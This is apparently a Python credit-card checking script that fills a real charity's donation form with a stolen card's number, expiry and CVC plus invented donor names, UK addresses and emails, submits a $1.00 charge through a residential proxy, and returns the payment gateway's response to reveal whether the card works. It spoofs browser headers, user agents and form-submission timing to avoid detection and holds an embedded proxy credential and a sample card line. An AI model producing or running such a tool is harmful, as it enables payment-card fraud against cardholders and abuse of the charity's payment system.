import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from urllib.parse import urlparse, urlencode, parse_qs

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "proxy.insideproxy.net:3389:res-any:pgw-df6b371b8ec65c798929f20b1b3257302159d84a48d2a1d5"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx = ccx.strip()
    numbers = re.findall(r"\d+", ccx)
    n = mm = yy = cvc = ""
    if len(numbers) >= 4:
        n = numbers[0]
        mm = numbers[1]
        yy = numbers[2]
        cvc = numbers[3]
        mm = str(int(mm))
        if len(yy) == 4:
            yy = yy[-2:]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    
    random_speed = random.randint(15000, 45000)
    dynamic_speed_json = json.dumps({"pages": {"1": [random_speed]}})
    session = requests.Session()
    
    headers = {
        'authority': 'thekingsmenmvmt.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://thekingsmenmvmt.org/donate/', headers=headers)
    
    ajax = re.search(r"hash=(.*?)'", response.text).group(1)
    currency = re.search(r"data-currency='USD' value='(.*?)'", response.text).group(1)
    state = re.search(r"name='state_2' value='(.*?)'", response.text).group(1)
    version = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
    print(ajax)
    print(currency)
    print(state)
    print(version)
    
    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-29%2002%3A25%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fthekingsmenmvmt.org%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_first_add': 'fd%3D2026-05-29%2002%3A25%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fthekingsmenmvmt.org%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthekingsmenmvmt.org%2Fdonate%2F',
        '_ga': 'GA1.1.1168643472.1780021536',
        '_ga_SVRPMP0WF1': 'GS2.1.s1780021535$o1$g1$t1780021575$j20$l0$h0',
    }
    
    headers = {
        'authority': 'thekingsmenmvmt.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOSgv11rk3SCm19kl',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-29%2002%3A25%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fthekingsmenmvmt.org%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-05-29%2002%3A25%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fthekingsmenmvmt.org%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthekingsmenmvmt.org%2Fdonate%2F; _ga=GA1.1.1168643472.1780021536; _ga_SVRPMP0WF1=GS2.1.s1780021535$o1$g1$t1780021575$j20$l0$h0',
        'origin': 'https://thekingsmenmvmt.org',
        'referer': 'https://thekingsmenmvmt.org/donate/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    files = [
        ('input_1', (None, f'{first_name} {last_name}')),
        ('input_9', (None, f'rodamuser{nr}@gmail.com')),
        ('input_6', (None, '$1.00')),
        ('input_5', (None, '')),
        ('input_8', (None, '$1.00')),
        ('input_7.1', (None, f'{n}')),
        ('input_7.2[]', (None, f'{mm}')),
        ('input_7.2[]', (None, f'20{yy}')),
        ('input_7.3', (None, f'{cvc}')),
        ('input_7.5', (None, f'{first_name} {last_name}')),
        ('gform_ajax', (None, f'form_id=2&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={ajax}')),
        ('gform_submission_method', (None, 'iframe')),
        ('gform_theme', (None, 'gravity-theme')),
        ('gform_style_settings', (None, '[]')),
        ('is_submit_2', (None, '1')),
        ('gform_submit', (None, '2')),
        ('gform_currency', (None, f'{currency}')),
        ('gform_unique_id', (None, '')),
        ('state_2', (None, f'{state}')),
        ('gform_target_page_number_2', (None, '0')),
        ('gform_source_page_number_2', (None, '1')),
        ('gform_field_values', (None, '')),
        ('version_hash', (None, f'{version}')),
        ('gform_submission_speeds', (None, dynamic_speed_json)),
    ]
    
    response = session.post('https://thekingsmenmvmt.org/donate/', #cookies=cookies, 
    headers=headers, files=files)
    
    try:
        result = re.search(r"class='gfield_description validation_message gfield_validation_message'><!-- (.*?)<\/div><\/fieldset>", response.text).group(1)
    except:
        result = re.search(r'document.location.href="(.*?)"', response.text).group(1)
    return result
    
#test_card = "5311024271771951|09|2034|218"
#print(Tele(test_card))
